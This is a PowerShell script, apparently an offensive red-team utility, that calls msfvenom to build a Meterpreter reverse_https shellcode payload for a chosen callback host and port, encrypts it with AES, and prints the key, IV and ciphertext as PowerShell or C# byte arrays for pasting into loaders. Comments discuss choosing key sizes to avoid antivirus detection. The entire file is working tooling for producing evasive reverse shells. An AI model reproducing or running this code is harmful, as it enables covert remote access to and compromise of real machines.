function Get-RandomBytes($Size) {
    $rb = [Byte[]]::new($Size)
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($rb)
    $rng.Dispose()
    return $rb
}

function Format-ByteArrayToHex($Bytes, $VarName, $Format) {
    $hex = ''
    for ($count = 0; $count -lt $Bytes.Count; $count++) {
        [Byte]$b = $Bytes[$count]
        if (($count + 1) -eq $Bytes.Length) {
            # If this is the last byte don't append a comma
            $hex += "0x{0:x2}" -f $b
        } 
        Else {
            $hex += "0x{0:x2}," -f $b
        }
        
        # Let's keep the output clean so only 15 bytes are in a row
        if (($count + 1) % 15 -eq 0) {
            $hex += "{0}" -f "`n"
        }
    }
    # Output the hex into a format we can just copy/paste for later use
    switch ($Format) {
        'PS1' { $formatted = '[Byte[]]{0} = {1}{2}' -f $('$' + $VarName), "`n", $hex }
        'CSharp' { $formatted = 'byte[] {0} = new byte[{1}] {{ {2}{3} }};' -f $($VarName), $Bytes.Length, "`n", $hex }
    }
    
    return $formatted
}

function Encrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider

    # 128-bit | 192-bit | 256-bit
    # I found that some vendors flag payloads more that use 256-bit vs 128-bit. Something to keep in mind.
    $aes.KeySize = 256
    
    # Does not change between 128/192/256-bit key lengths
    $aes.BlockSize = 128
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.key = $Key
    $aes.IV = $IV

    $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
    $encrypted = $encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
    
    # If you keep powershell open this will stay in memory, dispose those secrets!
    $aes.Dispose() 
    return $encrypted
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.KeySize = 256
    $aes.BlockSize = 128

    # Keep this in mind when you view your decrypted content as the size will likely be different
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aes.key = $Key
    $aes.IV = $IV

    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 

    # If you keep powershell open this will stay in memory, dispose those secrets!
    $aes.Dispose()
    return $decrypted
}

function Invoke-ShCrypt {

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $false, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $false)]
        [string]$Payload = 'windows/x64/meterpreter/reverse_https',

        [Parameter(Position = 1, Mandatory = $true, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $false)]
        [string]$LHOST,

        [Parameter(Position = 2, Mandatory = $true, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $false)]
        [int]$LPORT,

        [Parameter(Position = 3, Mandatory = $true, ValueFromPipeline = $false, ValueFromPipelineByPropertyName = $false)]
        [ValidateSet("PS1", "CSharp")]
        [string]$Format
    )
    Begin {
        # 16 Bytes > AES-128 | 24 Bytes > AES-192 | 32 Bytes > AES-256
        [Byte[]]$Key = Get-RandomBytes -Size 32

        # This does not change between different key lengths
        [Byte[]]$IV = Get-RandomBytes -Size 16

        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f ps1 -v payload
        [Byte[]] $shellcode = $(Invoke-Expression "msfvenom -p $Payload SSLVERSION=TLS1.2 LHOST=$Lhost LPORT=$Lport EXITFUNC=thread -f ps1 -v payload 2>&1")[-1].replace('[Byte[]] $payload = ', '') -split ','
    }
    Process {
        # Encrypt
        $encBytes = Encrypt-Bytes -Bytes $shellcode -Key $Key -IV $IV

        # Format our byte array into a variable format we can use later
        $keyStr = Format-ByteArrayToHex -Bytes $key -VarName 'Key' -Format $Format
        $ivStr = Format-ByteArrayToHex -Bytes $iv -VarName 'IV' -Format $Format
        $rawStr = Format-ByteArrayToHex -Bytes $shellcode -VarName 'Raw' -Format $Format
        $encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName 'Encrypted' -Format $Format
    }
    End {
        Write-Host $keyStr `n
        Write-Host $ivStr `n
        Write-Host $encStr `n
        Write-Host $rawStr
    }
}
